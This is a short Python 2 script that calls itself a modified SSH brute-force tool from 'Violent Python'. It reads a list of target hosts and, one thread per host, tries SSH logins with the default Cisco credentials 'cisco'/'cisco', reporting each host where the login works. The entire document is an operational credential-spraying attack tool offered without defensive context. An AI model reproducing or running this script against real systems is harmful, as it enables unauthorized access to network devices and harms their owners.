# Modified SSH bruteforce script from Violent Python
import pxssh
import optparse
from threading import *

def connect(host, user, password):
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print '[+] Password Found: ' + password + ' on: '+host
    except Exception, e:
        print 'Login failed on:'+host

def main():
    parser = optparse.OptionParser('usage %prog '+'-H <target host> -u <user> -F <password list>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    (options, args) = parser.parse_args()
    hostFile = options.tgtHost
    password = 'cisco'
    user = 'cisco'
    fn = open(hostFile, 'r')
    for line in fn.readlines():
        host = line.strip('\r').strip('\n')
        print "[-] Testing: "+str(password)+host
        t = Thread(target=connect, args=(host, user, password))
        child = t.start()

if __name__ == '__main__':
    main()                                       
